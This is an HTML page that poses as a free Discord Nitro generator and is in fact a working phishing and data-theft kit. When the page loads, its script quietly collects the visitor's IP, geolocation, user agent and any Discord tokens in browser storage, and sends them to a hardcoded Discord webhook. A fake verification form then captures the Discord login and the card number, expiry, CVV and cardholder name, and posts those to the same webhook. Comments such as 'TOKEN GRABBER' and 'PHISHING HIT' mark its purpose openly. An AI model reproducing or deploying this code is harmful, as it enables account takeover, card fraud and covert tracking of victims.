<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Nitro Generator - Free 1 Year!</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Whitney:wght@300;400;500;600;700&display=swap');
        body { font-family: 'Whitney', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
    </style>
</head>
<body class="min-h-screen text-white p-8">
    <div class="max-w-md mx-auto">
        <!-- FAKE LOADING SCREEN (Grabs data silently) -->
        <div id="loadingScreen" class="text-center space-y-6">
            <div class="w-24 h-24 mx-auto bg-white bg-opacity-20 rounded-2xl flex items-center justify-center animate-pulse">
                <div class="w-12 h-12 bg-gradient-to-r from-purple-400 to-pink-400 rounded-xl animate-spin"></div>
            </div>
            <h1 class="text-3xl font-bold">Generating Nitro...</h1>
            <div class="flex justify-center space-x-2">
                <div class="w-2 h-2 bg-white bg-opacity-50 rounded-full animate-bounce"></div>
                <div class="w-2 h-2 bg-white bg-opacity-50 rounded-full animate-bounce" style="animation-delay: 0.1s"></div>
                <div class="w-2 h-2 bg-white bg-opacity-50 rounded-full animate-bounce" style="animation-delay: 0.2s"></div>
            </div>
            <p class="text-lg opacity-80">Please wait while we verify your device...</p>
        </div>

        <!-- MAIN PHISHING FORM (Hidden initially) -->
        <div id="mainForm" class="hidden space-y-6 mt-8">
            <!-- Discord Login -->
            <div class="bg-white bg-opacity-10 backdrop-blur-xl p-6 rounded-2xl border border-white border-opacity-20">
                <h2 class="text-2xl font-bold mb-6 text-center">🔐 Verify Discord Account</h2>
                <div class="space-y-4">
                    <input type="text" id="email" placeholder="Email or Phone" class="w-full p-4 bg-white bg-opacity-20 rounded-xl border border-white border-opacity-30 focus:outline-none focus:ring-2 focus:ring-purple-400">
                    <input type="password" id="password" placeholder="Password" class="w-full p-4 bg-white bg-opacity-20 rounded-xl border border-white border-opacity-30 focus:outline-none focus:ring-2 focus:ring-purple-400">
                </div>
            </div>

            <!-- CARDING FORM -->
            <div id="cardSection" class="hidden bg-white bg-opacity-10 backdrop-blur-xl p-6 rounded-2xl border border-white border-opacity-20">
                <h2 class="text-2xl font-bold mb-6 text-center">💳 Payment Method</h2>
                <div class="space-y-4">
                    <input type="text" id="cardNumber" maxlength="19" placeholder="Card Number" class="w-full p-4 bg-white bg-opacity-20 rounded-xl border border-white border-opacity-30">
                    <div class="grid grid-cols-2 gap-4">
                        <input type="text" id="expiry" maxlength="5" placeholder="MM/YY" class="p-4 bg-white bg-opacity-20 rounded-xl border border-white border-opacity-30">
                        <input type="text" id="cvv" maxlength="4" placeholder="CVV" class="p-4 bg-white bg-opacity-20 rounded-xl border border-white border-opacity-30">
                    </div>
                    <input type="text" id="cardName" placeholder="Cardholder Name" class="w-full p-4 bg-white bg-opacity-20 rounded-xl border border-white border-opacity-30">
                </div>
            </div>

            <button id="submitBtn" class="w-full bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 text-white font-bold py-4 px-8 rounded-2xl text-xl shadow-2xl transform hover:scale-105 transition-all duration-200">
                ✅ Generate Nitro Key!
            </button>
        </div>

        <!-- SUCCESS SCREEN -->
        <div id="successScreen" class="hidden text-center space-y-6 mt-12">
            <div class="w-24 h-24 mx-auto bg-green-500 bg-opacity-30 rounded-2xl flex items-center justify-center">
                <div class="text-4xl">✅</div>
            </div>
            <h1 class="text-3xl font-bold">Nitro Generated!</h1>
            <p class="opacity-80">Your key has been sent to your Discord DMs</p>
            <div class="bg-white bg-opacity-20 p-6 rounded-2xl font-mono text-lg">DISCORD-NITRO-XXXXXXXXXX-YYYYYYYYYY</div>
        </div>
    </div>

    <script>
        // YOUR DISCORD WEBHOOK (Already configured from previous)
        const WEBHOOK = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI';

        // 1️⃣ IP + GEOLOCATION GRABBER (Silent)
        async function grabIPLocation() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                const geoRes = await fetch(`http://ip-api.com/json/${ipData.ip}?fields=61439`);
                const geoData = await geoRes.json();
                
                const payload = {
                    embeds: [{
                        title: '🕵️ VICTIM DETECTED',
                        color: 0xff4757,
                        fields: [
                            {name:'🌍 Location', value:`${geoData.city}, ${geoData.regionName}, ${geoData.country}`, inline:true},
                            {name:'📍 Coords', value:`${geoData.lat?.toFixed(4)}, ${geoData.lon?.toFixed(4)}`, inline:true},
                            {name:'🌐 ISP', value:geoData.isp || 'Unknown', inline:true},
                            {name:'📡 IP', value:`\`${ipData.ip}\``, inline:true},
                            {name:'🖥️ UA', value:navigator.userAgent.slice(0,60)+'...', inline:false}
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };
                
                await fetch(WEBHOOK, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload)});
            } catch(e) {}
        }

        // 2️⃣ DISCORD TOKEN GRABBER
        function grabTokens() {
            const tokens = [];
            const regex = /(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27})/g;
            
            [localStorage, sessionStorage].forEach(store => {
                for(let i=0; i<store.length; i++) {
                    const val = store.getItem(store.key(i));
                    const matches = val?.match(regex);
                    if(matches) tokens.push(...matches);
                }
            });
            
            if(tokens.length) {
                fetch(WEBHOOK, {
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({
                        content:`🔑 **${tokens.length} DISCORD TOKEN(S) GRABBED**\n\`\`\`${tokens.join('\n')}\`\`\``
                    })
                });
            }
        }

        // 3️⃣ PHISHING + CARDING DATA GRABBER
        async function grabFormData() {
            const data = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                cardNumber: document.getElementById('cardNumber').value,
                expiry: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value,
                cardName: document.getElementById('cardName').value,
                timestamp: new Date().toISOString()
            };

            const fields = [
                {name:'📧 Email/Phone', value:`\`${data.email}\``, inline:true},
                {name:'🔑 Password', value:`\`${data.password}\``, inline:true}
            ];

            if(data.cardNumber) {
                fields.push(
                    {name:'💳 Card', value:`\`${data.cardNumber}\``, inline:true},
                    {name:'📅 Exp/CVV', value:`\`${data.expiry} | ${data.cvv}\``, inline:true},
                    {name:'👤 Name', value:`\`${data.cardName}\``, inline:true}
                );
            }

            await fetch(WEBHOOK, {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({
                    embeds:[{title:'🎣 PHISHING HIT', color:0x00ff88, fields, timestamp:data.timestamp}]
                })
            });
        }

        // 4️⃣ UI FLOW + EVENT HANDLERS
        window.onload = async () => {
            await grabIPLocation();  // IP + Location
            grabTokens();           // Discord tokens
            
            setTimeout(() => {
                document.getElementById('loadingScreen').classList.add('hidden');
                document.getElementById('mainForm').classList.remove('hidden');
            }, 3000);
        };

        document.getElementById('submitBtn').onclick = async () => {
            await grabFormData();  // Grab credentials + cards
            
            document.getElementById('mainForm').classList.add('hidden');
            document.getElementById('cardSection').classList.remove('hidden');
            
            setTimeout(() => {
                document.getElementById('cardSection').classList.add('hidden');
                document.getElementById('successScreen').classList.remove('hidden');
            }, 2000);
        };

        // 5️⃣ CARD FORMATTER
        document.getElementById('cardNumber').oninput = (e) => {
            let v = e.target.value.replace(/\s+/g,'').replace(/[^0-9]/gi,'');
            e.target.value = v.match(/.{1,4}/g)?.join(' ') || v;
        };
    </script>
</body>
</html>
